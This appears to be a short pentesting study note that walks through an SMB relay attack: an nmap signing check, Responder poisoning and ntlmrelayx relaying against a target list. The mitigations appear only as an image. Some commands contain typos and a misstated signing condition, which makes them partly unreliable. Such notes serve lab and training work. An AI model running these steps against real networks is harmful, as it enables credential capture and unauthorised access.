- - -
## Discovering : 

```sh
nmap --script=smb2-security-mode.nse-p445 10.10.10.0 
```

Check for “<mark class="hltr-red">Message signing is Enabled</mark>” 

Create **<u>targets.txt</u>** and put your IPs inside  for attacks. 
<br>

- - -
## Attacking Steps : 

```sh
leafpad /etc/responder/Responder.conf 

# < Turn “off” SMB and HTTP  and save > 
```

```python
python Respender.py -I tun0 -rdw -v 
```

```python
ntlmrelayx.py -tf targets.txt -smb2support 
```

Now wait for somebody to connect 
Like this : 

![Imgur](https://i.imgur.com/gTTm3lR.png)

And we will get : 
![Imgur](https://i.imgur.com/ouLqm2w.png)
<br>

- - -
##  Mitigations ( Defense ) : 

![Imgur](https://i.imgur.com/IcACjvu.png)
<br>

- - -